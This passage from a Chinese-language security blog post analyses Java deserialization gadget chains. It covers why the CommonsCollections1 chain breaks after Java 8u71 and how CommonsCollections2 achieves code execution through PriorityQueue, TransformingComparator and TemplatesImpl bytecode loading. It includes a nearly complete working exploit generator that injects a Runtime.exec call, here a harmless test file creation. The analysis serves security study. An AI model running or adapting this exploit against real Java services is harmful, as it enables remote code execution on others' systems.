</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span><span style=color:#ff79c6>(</span>Iterator var8 <span style=color:#ff79c6>=</span> streamVals<span style=color:#ff79c6>.</span><span style=color:#50fa7b>entrySet</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>iterator</span><span style=color:#ff79c6>();</span> var8<span style=color:#ff79c6>.</span><span style=color:#50fa7b>hasNext</span><span style=color:#ff79c6>();</span> mv<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>name<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Entry<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>&gt;</span> memberValue <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Entry<span style=color:#ff79c6>)</span>var8<span style=color:#ff79c6>.</span><span style=color:#50fa7b>next</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        name <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>)</span>memberValue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        value <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        Class<span style=color:#ff79c6>&lt;?&gt;</span> memberType <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>)</span>memberTypes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>name<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>memberType <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            value <span style=color:#ff79c6>=</span> memberValue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>memberType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isInstance</span><span style=color:#ff79c6>(</span>value<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!(</span>value <span style=color:#ff79c6>instanceof</span> ExceptionProxy<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                value <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> AnnotationTypeMismatchExceptionProxy<span style=color:#ff79c6>(</span>value<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;[&#34;</span> <span style=color:#ff79c6>+</span> value <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;]&#34;</span><span style=color:#ff79c6>)).</span><span style=color:#50fa7b>setMember</span><span style=color:#ff79c6>((</span>Method<span style=color:#ff79c6>)</span>annotationType<span style=color:#ff79c6>.</span><span style=color:#50fa7b>members</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>name<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    AnnotationInvocationHandler<span style=color:#ff79c6>.</span><span style=color:#50fa7b>UnsafeAccessor</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setType</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>,</span> t<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    AnnotationInvocationHandler<span style=color:#ff79c6>.</span><span style=color:#50fa7b>UnsafeAccessor</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setMemberValues</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>,</span> mv<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到很明显的两处变化是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>AnnotationInvocationHandler<span style=color:#ff79c6>.</span><span style=color:#50fa7b>UnsafeAccessor</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setType</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>,</span> t<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>AnnotationInvocationHandler<span style=color:#ff79c6>.</span><span style=color:#50fa7b>UnsafeAccessor</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>setMemberValues</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>,</span> mv<span style=color:#ff79c6>);</span>
</span></span></code></pre></div><p>其将反序列化后的 memberValues 设为了 mv, 而 mv 是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Map<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>&gt;</span> mv <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> LinkedHashMap<span style=color:#ff79c6>();</span>
</span></span></code></pre></div><p>不是我们设置的 LazyMap, 这自然导致了在外层 AnnotationInvocationHandler 调用 proxy 时, 内层的 AnnotationInvocationHandler 的 memberValues 是 被重新设置的 LinkedHashMap, 而不是我们构造的 LazyMap, 自然就无法利用了.</p><p>看看 java 对 AnnotationInvocationHandler 的修复</p><p>ysoseiral 这个 exp 在 2015 年初被发布<br><img src=https://i.loli.net/2020/01/21/qfzXF9TOvtIoKxb.png alt></p><p>查看 git 的 history, 可以看到在 2015 年 12 月被修复
<img src=https://i.loli.net/2020/01/21/fBmpoH35E1hgj9e.png alt></p><p>java8u71 2016 年初发布<br><img src=https://i.loli.net/2020/01/21/RVu7qSnNl2FQBt6.png alt></p><p>再看 commons-collections3 的修复:</p><p><img src=https://i.loli.net/2020/01/23/XgxnUcD3A1rJFGb.png alt></p><p>在 readObject, writeObject 时都做了检测, 需要设置对应的 Property 为 true 才能反序列化 InvokerTransformer.</p><p>看这个漏洞的历史, 也是非常有趣的.</p><h2 id=commonscollections2>CommonsCollections2</h2><p>还是先看调用栈</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Gadget chain:
</span></span><span style=display:flex><span>    ObjectInputStream.readObject()
</span></span><span style=display:flex><span>        PriorityQueue.readObject()
</span></span><span style=display:flex><span>            ...
</span></span><span style=display:flex><span>                TransformingComparator.compare()
</span></span><span style=display:flex><span>                    InvokerTransformer.transform()
</span></span><span style=display:flex><span>                        Method.invoke()
</span></span><span style=display:flex><span>                            Runtime.exec()
</span></span></code></pre></div><p>这个 gadget 比较特殊的是用了 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个内置类, 这个类的骚操作就是, 在调用他的 <code>newTransformer</code> 或者 <code>getOutputProperties</code> (这个方法内部会调用 <code>newTransformer</code>) 时, 会动态从字节码中重建一个类. 这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>synchronized</span> Transformer <span style=color:#50fa7b>newTransformer</span><span style=color:#ff79c6>()</span> <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    TransformerImpl transformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TransformerImpl<span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getTransletInstance</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_outputProperties</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_indentNumber</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_tfactory</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_uriResolver</span> <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        transformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setURIResolver</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_uriResolver</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_tfactory</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getFeature</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;http://javax.xml.XMLConstants/feature/secure-processing&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        transformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setSecureProcessing</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> Translet <span style=color:#50fa7b>getTransletInstance</span><span style=color:#ff79c6>()</span> <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_name</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_class</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>defineTransletClasses</span><span style=color:#ff79c6>();</span> <span style=color:#6272a4>// 这个方法里面调用了 ClassLoader 加载 bytecode
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>//... 省略
</span></span></span></code></pre></div><p>同时在这个 gadget 中, 没有使用之前的 LazyMap, 而是使用的是 PriorityQueue + TransformingComparator 这套组合拳.<br>不过这个 exp 只对 CommonsCollections4 有效, 在 3 中 TransformingComparator 没有 implements Serializable, 导致无法序列化.</p><p>java.util.PriorityQueue</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>(</span>ObjectInputStream s<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException<span style=color:#ff79c6>,</span> ClassNotFoundException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    s<span style=color:#ff79c6>.</span><span style=color:#50fa7b>defaultReadObject</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    s<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readInt</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    SharedSecrets<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getJavaObjectInputStreamAccess</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>checkArray</span><span style=color:#ff79c6>(</span>s<span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>size</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    Object<span style=color:#ff79c6>[]</span> es <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>queue</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[</span>Math<span style=color:#ff79c6>.</span><span style=color:#50fa7b>max</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>size</span><span style=color:#ff79c6>,</span> 1<span style=color:#ff79c6>)];</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> n <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>size</span><span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> n<span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        es<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>heapify</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>PriorityQueue readObject 时, 在读取完对象后, 会调用 heapify 来进行排序, 而排序方法是可以自定义的 (利用 Comparator 接口), 配合上 TransformingComparator.</p><p>org.apache.commons.collections4.comparators.TransformingComparator (实现了 Comparator 接口)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>int</span> <span style=color:#50fa7b>compare</span><span style=color:#ff79c6>(</span>I obj1<span style=color:#ff79c6>,</span> I obj2<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    O value1 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>transformer</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>obj1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    O value2 <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>transformer</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>obj2<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>decorated</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>compare</span><span style=color:#ff79c6>(</span>value1<span style=color:#ff79c6>,</span> value2<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>在排序时会先 transform 一下, 再结合喜闻乐见的 InvokeTransfer, 导致 RCE.</p><p>最后 exp 如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassClassPath<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassPool<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.CtClass<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.functors.InvokerTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.PriorityQueue<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections2</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Placeholder</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        String AbstractTranslet <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        String TemplatesImpl <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ClassPool classPool <span style=color:#ff79c6>=</span> ClassPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDefault</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>Placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>)));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        CtClass placeholder <span style=color:#ff79c6>=</span> classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setSuperclass</span><span style=color:#ff79c6>(</span>classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>()));</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>makeClassInitializer</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>insertAfter</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.lang.Runtime.getRuntime().exec(\&#34;touch /dev/shm/rmb122_test1\&#34;);&#34;</span><span style=color:#ff79c6>);</span> <span style=color:#6272a4>// 这里 insertBefore 还是 After 都一样
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;demo.rmb122.&#34;</span> <span style=color:#ff79c6>+</span> System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>currentTimeMillis</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytecode <span style=color:#ff79c6>=</span> placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toBytecode</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Object templates <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>TemplatesImpl<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getConstructor</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}).</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        Field fieldByteCodes <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_bytecodes&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[][]{</span>bytecode<span style=color:#ff79c6>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Field fieldName <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_name&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;rmb122&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        InvokerTransformer invokerTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;newTransformer&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{});</span>
</span></span><span style=display:flex><span>        TransformingComparator comparator <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TransformingComparator<span style=color:#ff79c6>(</span>invokerTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        PriorityQueue queue <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> PriorityQueue<span style=color:#ff79c6>(</span>2<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        queue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>add</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        queue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>add</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Field field <span style=color:#ff79c6>=</span> PriorityQueue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;queue&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object<span style=color:#ff79c6>[]</span> innerArr <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Object<span style=color:#ff79c6>[])</span> field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        innerArr<span style=color:#ff79c6>[</span>0<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        innerArr<span style=color:#ff79c6>[</span>1<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        field <span style=color:#ff79c6>=</span> PriorityQueue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;comparator&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>,</span> comparator<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>);</span>
